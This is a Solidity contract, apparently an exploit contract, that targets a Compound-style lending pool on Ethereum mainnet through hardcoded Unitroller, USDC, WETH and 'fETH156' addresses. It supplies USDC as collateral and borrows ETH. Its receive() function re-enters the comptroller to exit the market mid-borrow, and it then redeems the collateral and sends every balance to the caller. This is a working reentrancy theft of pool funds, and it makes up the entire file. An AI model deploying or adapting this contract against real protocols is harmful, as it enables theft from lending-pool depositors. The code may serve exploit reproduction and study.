// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "../HarvestFF/interfaces/IERC20.sol";
import "./interfaces/CErc20Interface.sol";
import "./interfaces/ComptrollerInterface.sol";


interface IFToken {
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function getCash() external view returns (uint);
    function totalBorrows() external view returns (uint256);
    function totalReserves() external view returns (uint256);
}

contract Convert18 {
    ComptrollerInterface private constant unitroller = ComptrollerInterface(0x621579DD26774022F33147D3852ef4E00024b763); // Unitroller
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // balancer protocol flash loan check
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    
    // FxToken Address
    // 0xe92a3db67e4b6AC86114149F522644b34264f858
    address constant fETH = address(0xFA1057d02A0C1a4885851e3F4fD496Ee7D38F56e); //fETH156
    address private fTokenCache;
    uint256 private mintTokenCache;

    constructor() {}

    receive () external payable {
        unitroller.exitMarket(fTokenCache);
    }   

    function _bootLoad(address fToken) external {
        fTokenCache = fToken;
        address[] memory em = new address[](1);
        em[0] = fToken;
        unitroller.enterMarkets(em);
    }
    function _cBorrow(uint cBorrow) external {
        IFToken(fETH).borrow(cBorrow);
    }

    function _cMint() external {
        USDC.approve(fTokenCache, type(uint256).max);
        uint _USDCBalance = USDC.balanceOf(address(this));
        CErc20Interface(fTokenCache).mint(_USDCBalance);
        mintTokenCache = _USDCBalance;
    }


    function _cRedeemAll() external {
        CErc20Interface(fTokenCache).approve(fTokenCache, type(uint256).max);
        CErc20Interface(fTokenCache).redeemUnderlying(mintTokenCache);

        uint256 new_USDCBalance = USDC.balanceOf(address(this));
        USDC.transfer(msg.sender, new_USDCBalance);
        payable(msg.sender).transfer(address(this).balance);
    }
}
